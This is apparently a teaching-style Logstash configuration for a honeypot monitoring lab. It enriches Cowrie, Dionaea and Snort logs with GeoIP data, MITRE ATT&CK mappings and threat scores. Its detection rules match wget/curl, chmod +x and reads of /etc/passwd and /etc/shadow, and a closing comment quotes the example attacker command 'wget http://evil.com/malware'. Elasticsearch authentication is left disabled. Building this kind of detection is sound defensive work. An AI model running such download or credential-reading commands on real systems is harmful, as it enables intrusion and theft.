# ========================================
# Logstash Main Configuration
# ========================================
# LEARNING: Logstash is the "L" in ELK
# It parses, enriches, and transforms logs
#
# Three-stage pipeline:
# 1. INPUT: Receive logs (from Filebeat)
# 2. FILTER: Parse, enrich, transform
# 3. OUTPUT: Send to Elasticsearch
# ========================================

# ========================================
# INPUT SECTION
# ========================================
# LEARNING: Where logs come from

input {
  # Beats input (Filebeat)
  # LEARNING: This is the primary input for our platform
  beats {
    port => 5044
    # LEARNING: Filebeat connects here to ship logs
    
    # No codec needed - Filebeat sends in Beats protocol format
    # Filebeat already parses JSON (configured in filebeat.yml)
    
    # SSL/TLS (enable in production)
    # ssl => true
    # ssl_certificate => "/etc/logstash/ssl/logstash.crt"
    # ssl_key => "/etc/logstash/ssl/logstash.key"
  }
  
  # Optional: Direct TCP/UDP input
  # tcp {
  #   port => 5000
  #   type => "syslog"
  # }
}

# ========================================
# FILTER SECTION
# ========================================
# LEARNING: This is where the magic happens
# We parse, enrich, and transform logs

filter {
  # -----------------------------------------
  # Route to specific pipeline based on tags
  # -----------------------------------------
  # LEARNING: Different log types need different parsing
  
  # Cowrie logs
  if "cowrie" in [tags] {
    # Cowrie outputs JSON, so already parsed
    # But we'll add enrichment
    
    # Extract source IP
    if [src_ip] {
      # GeoIP lookup
      # LEARNING: Maps IP to country, city, coordinates
      geoip {
        source => "src_ip"
        target => "geoip"
        database => "/usr/share/logstash/geoip/GeoLite2-City.mmdb"
      }
      
      # ASN lookup (which organization owns this IP)
      geoip {
        source => "src_ip"
        target => "geoip_asn"
        database => "/usr/share/logstash/geoip/GeoLite2-ASN.mmdb"
      }
    }
    
    # Add MITRE ATT&CK mapping
    # LEARNING: Map attacker commands to tactics/techniques
    if [input] {
      # Check for common attack patterns
      if [input] =~ /wget|curl/ {
        mutate {
          add_field => {
            "[mitre][tactic]" => "TA0011"
            "[mitre][tactic_name]" => "Command and Control"
            "[mitre][technique]" => "T1105"
            "[mitre][technique_name]" => "Ingress Tool Transfer"
          }
        }
      }
      
      if [input] =~ /chmod \+x/ {
        mutate {
          add_field => {
            "[mitre][tactic]" => "TA0002"
            "[mitre][tactic_name]" => "Execution"
            "[mitre][technique]" => "T1059"
            "[mitre][technique_name]" => "Command and Scripting Interpreter"
          }
        }
      }
      
      if [input] =~ /\/etc\/passwd|\/etc\/shadow/ {
        mutate {
          add_field => {
            "[mitre][tactic]" => "TA0006"
            "[mitre][tactic_name]" => "Credential Access"
            "[mitre][technique]" => "T1003"
            "[mitre][technique_name]" => "OS Credential Dumping"
          }
        }
      }
    }
    
    # Calculate threat score
    # LEARNING: Assign numeric score based on severity
    ruby {
      code => '
        score = 0
        
        # Login attempts
        if event.get("eventid") == "cowrie.login.failed"
          score += 3
        elsif event.get("eventid") == "cowrie.login.success"
          score += 7
        end
        
        # Command execution
        if event.get("eventid") == "cowrie.command.input"
          score += 5
          
          # High-risk commands
          input = event.get("input").to_s
          score += 10 if input =~ /wget|curl/
          score += 15 if input =~ /chmod \+x/
          score += 20 if input =~ /\/etc\/passwd/
        end
        
        # File downloads
        if event.get("eventid") == "cowrie.session.file_download"
          score += 15
        end
        
        event.set("threat_score", score)
        
        # Set severity level
        if score >= 50
          event.set("severity", "critical")
        elsif score >= 30
          event.set("severity", "high")
        elsif score >= 15
          event.set("severity", "medium")
        else
          event.set("severity", "low")
        end
      '
    }
    
    # Set index name
    mutate {
      add_field => { "[@metadata][target_index]" => "cowrie-%{+YYYY.MM.dd}" }
    }
  }
  
  # -----------------------------------------
  # Dionaea logs
  # -----------------------------------------
  if "dionaea" in [tags] {
    # Parse Dionaea JSON
    
    # GeoIP lookup
    if [remote_host] {
      geoip {
        source => "remote_host"
        target => "geoip"
        database => "/usr/share/logstash/geoip/GeoLite2-City.mmdb"
      }
    }
    
    # Threat scoring for Dionaea
    ruby {
      code => '
        score = 0
        
        connection = event.get("connection_type").to_s
        
        # SMB connections (potential ransomware)
        score += 20 if connection == "smb"
        
        # HTTP exploits
        score += 15 if connection == "http"
        
        # Malware downloads
        if event.get("download")
          score += 25
        end
        
        event.set("threat_score", score)
        
        if score >= 40
          event.set("severity", "critical")
        elsif score >= 25
          event.set("severity", "high")
        elsif score >= 10
          event.set("severity", "medium")
        else
          event.set("severity", "low")
        end
      '
    }
    
    mutate {
      add_field => { "[@metadata][target_index]" => "dionaea-%{+YYYY.MM.dd}" }
    }
  }
  
  # -----------------------------------------
  # Snort IDS logs
  # -----------------------------------------
  if "snort" in [tags] {
    # Parse Snort fast alert format
    # Example: 02/08/26-13:34:58.563168 49.36.190.93:60352 -> 172.31.6.5:8000
    grok {
      match => {
        "message" => "%{IP:src_ip}:%{INT:src_port} -> %{IP:dst_ip}:%{INT:dst_port}"
      }
    }
    
    # Extract IP addresses
    if [src_ip] {
      geoip {
        source => "src_ip"
        target => "geoip"
        database => "/usr/share/logstash/geoip/GeoLite2-City.mmdb"
      }
    }
    
    if [dst_ip] {
      geoip {
        source => "dst_ip"
        target => "geoip_dst"
        database => "/usr/share/logstash/geoip/GeoLite2-City.mmdb"
      }
    }
    
    # Map to MITRE based on message content
    if [message] =~ /(?i)(scan|probe)/ {
      mutate {
        add_field => {
          "[mitre][tactic]" => "TA0043"
          "[mitre][technique]" => "T1046"
          "eventid" => "network.scan"
        }
      }
    } else if [message] =~ /(?i)(ssh|brute)/ {
      mutate {
        add_field => {
          "[mitre][tactic]" => "TA0006"
          "[mitre][technique]" => "T1110"
          "eventid" => "network.brute_force"
        }
      }
    } else {
      mutate {
        add_field => {
          "eventid" => "network.suspicious"
        }
      }
    }
    
    # Threat scoring for network events
    mutate {
      add_field => {
        "threat_score" => "15"
        "severity" => "medium"
      }
      convert => {
        "threat_score" => "integer"
      }
    }
    
    mutate {
      add_field => { "[@metadata][target_index]" => "snort-%{+YYYY.MM.dd}" }
    }
  }
  
  # -----------------------------------------
  # Common enrichment for all logs
  # -----------------------------------------
  
  # Add timestamp
  date {
    match => [ "timestamp", "ISO8601" ]
    target => "@timestamp"
  }
  
  # Remove unnecessary fields
  mutate {
    remove_field => [ "agent", "ecs", "input", "host.name" ]
  }
}

# ========================================
# OUTPUT SECTION
# ========================================
# LEARNING: Send to Elasticsearch

output {
  # Elasticsearch output
  elasticsearch {
    hosts => ["${ELASTIC_HOST}:9200"]
    # Authentication disabled for simplified deployment
    # user => "elastic"
    # password => "${ELASTIC_PASSWORD}"
    
    # Use dynamic index based on log type
    index => "%{[@metadata][target_index]}"
    
    # Template management
    manage_template => true
    
    # LEARNING: Templates define index mappings
    # This ensures fields have correct types (IP, geo_point, etc.)
  }
  
  # Debug output (optional - for troubleshooting)
  # Uncomment for troubleshooting
  # stdout {
  #   codec => rubydebug
  # }
}

# ========================================
# LEARNING: Logstash Performance Tuning
# ========================================
# For production, tune these in logstash.yml:
#
# pipeline.workers: 4  # CPU cores
# pipeline.batch.size: 125  # Events per batch
# pipeline.batch.delay: 50  # Milliseconds
#
# Monitoring:
# xpack.monitoring.enabled: true
# xpack.monitoring.elasticsearch.hosts: ["elasticsearch:9200"]
# ========================================

# ========================================
# INTERVIEW TALKING POINT
# ========================================
# Q: "How does your log enrichment pipeline work?"
#
# A: "My Logstash pipeline has three stages:
#
# 1. INPUT: Receive logs from Filebeat on port 5044
#
# 2. FILTER: This is where I add intelligence:
#    - GeoIP lookup: Map IPs to country/city/coordinates
#    - ASN lookup: Identify hosting provider
#    - MITRE ATT&CK mapping: Map commands to tactics/techniques
#    - Threat scoring: Calculate risk score (0-100)
#    - Severity classification: critical/high/medium/low
#
# 3. OUTPUT: Send enriched events to Elasticsearch
#
# For example, a raw Cowrie log might just say:
#   'User root executed: wget http://evil.com/malware'
#
# After enrichment it includes:
#   - Attacker location: Beijing, China
#   - Threat score: 75/100
#   - MITRE: T1105 (Ingress Tool Transfer)
#   - Severity: High
#   - ASN: Malicious Hosting Inc.
#
# This enriched data powers our threat intelligence dashboard."
# ========================================
